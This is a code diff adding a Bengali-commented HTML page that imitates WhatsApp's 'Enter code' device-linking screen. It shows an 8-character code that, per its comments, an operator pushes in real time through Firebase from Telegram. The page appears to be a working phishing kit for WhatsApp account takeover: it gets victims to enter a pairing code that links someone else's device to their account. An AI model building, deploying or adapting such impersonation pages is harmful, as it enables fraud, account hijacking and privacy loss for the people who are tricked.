@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Link Code</title>
+    <style>
+        /* হোয়াটসঅ্যাপ ইন্টারফেসের মতো ক্লিন ও প্রফেশনাল ডিজাইন */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .whatsapp-container {
+            width: 100%;
+            max-width: 500px;
+            padding: 30px 24px;
+            box-sizing: border-box;
+        }
+
+        /* ----- ১. ওয়েবসাইটের ওপরের অংশ (যা কখনো পরিবর্তন হবে না) ----- */
+        .header-section {
+            margin-bottom: 40px;
+        }
+
+        .header-section h2 {
+            font-size: 22px;
+            font-weight: 500;
+            color: #111b21;
+            margin: 0 0 20px 0;
+        }
+
+        .header-section p {
+            font-size: 15px;
+            color: #3b4a54;
+            line-height: 1.45;
+            margin: 0 0 8px 0;
+        }
+
+        .header-section .link-highlight {
+            color: #00a884;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* ----- ২. ওয়েবসাইটের নিচের অংশ (যা টেলিগ্রাম থেকে রিয়েল-টাইমে বদলাবে) ----- */
+        .dynamic-code-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 150px;
+        }
+
+        /* ৮টি কোডের জন্য চার-চার ভাগে সাজানো গ্রিড */
+        .code-grid {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 25px;
+        }
+
+        /* প্রতিটা ফাঁকা ঘরের ডিজাইন (আপনার স্ক্রিনশটের মতো গোল কোণাবিশিষ্ট আয়তক্ষেত্র) */
+        .box-cell {
+            width: 34px;
+            height: 46px;
+            border: 2px solid #111b21;
+            border-radius: 10px;
+            font-size: 22px;
+            font-weight: bold;
+            color: #111b21;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: transparent;
+            text-transform: uppercase;
+        }
+
+        /* মাঝখানের হাইফেন বা ড্যাশ (-) চিহ্নের ডিজাইন */
+        .hyphen {
+            font-size: 24px;
+            color: #111b21;
+            margin: 0 8px;
+            font-weight: bold;
+        }
+
+        /* স্ক্রিনশটের নিচের সেই গুরুত্বপূর্ণ সতর্কতা বার্তা */
+        .warning-text {
+            font-size: 14px;
+            color: #667781;
+            font-weight: 500;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        /* ডেটা না থাকলে বা লোড হওয়ার সময় দেখানোর জন্য */
+        .loading-placeholder {
+            color: #8696a0;
+            font-style: italic;
+            font-size: 15px;
+        }
+    </style>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+
+<div class="whatsapp-container">
+    
+    <div class="header-section">
+        <h2>Enter code</h2>
+        <p>To get your code: Go to WhatsApp on the web or on another device, then click <strong>Link with phone number</strong>. <span class="link-highlight">Learn more</span></p>
+    </div>
+
+    <div class="dynamic-code-section" id="dynamic-area">
+        <div class="loading-placeholder">Loading valid session...</div>
+    </div>
+
+</div>
+
+<script>
+  // ⚠️ আপনার Firebase Realtime Database-এর URL এখানে বসাবেন
+  const firebaseConfig = {
+    databaseURL: "https://your-firebase-database-default-rtdb.firebaseio.com/" 
+  };
+  
+  // ফায়ারবেস ইনিশিয়ালাইজ করা
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  // ফায়ারবেসের 'current_session' নোড থেকে রিয়েল-টাইমে ডেটা পড়া
+  database.ref('current_session').on('value', (snapshot) => {
+    const dynamicArea = document.getElementById('dynamic-area');
+    const data = snapshot.val();
+    
+    // যদি ডাটাবেজে ৮ অক্ষরের কোনো কোড থাকে (যেমন: ABCDE123)
+    if (data && data.code && data.code.length === 8) {
+        const fullCode = data.code.toUpperCase();
+        
+        // প্রথম ৪টি অক্ষর এবং শষের ৪টি অক্ষর আলাদা করা
+        const firstPart = fullCode.substring(0, 4);
+        const secondPart = fullCode.substring(4, 8);
+        
+        let gridHtml = '<div class="code-grid">';
+        
+        // প্রথম ৪টি ঘরের জন্য লুপ
+        for (let i = 0; i < 4; i++) {
+            gridHtml += `<div class="box-cell">${firstPart[i]}</div>`;
+        }
+        
+        // মাঝখানের হাইফেন (-)
+        gridHtml += '<span class="hyphen">-</span>';
+        
+        // শেষের ৪টি ঘরের জন্য লুপ
+        for (let i = 0; i < 4; i++) {
+            gridHtml += `<div class="box-cell">${secondPart[i]}</div>`;
+        }
+        
+        gridHtml += '</div>'; // গ্রিড শেষ
+        
+        // সতর্কতা টেক্সট যুক্ত করা
+        gridHtml += '<div class="warning-text">Never enter a code if you didn\'t request it.</div>';
+        
+        // ওয়েবসাইটে রিয়েল-টাইমে প্রদর্শন
+        dynamicArea.innerHTML = gridHtml;
+        
+    } else {
+        // যদি টেলিগ্রাম থেকে ডিলিট করে দেওয়া হয় বা কোনো কোড না থাকে
+        dynamicArea.innerHTML = '<div class="loading-placeholder">Waiting for code assignment...</div>';
+    }
+  });
+</script>
+
+</body>
+</html>
+
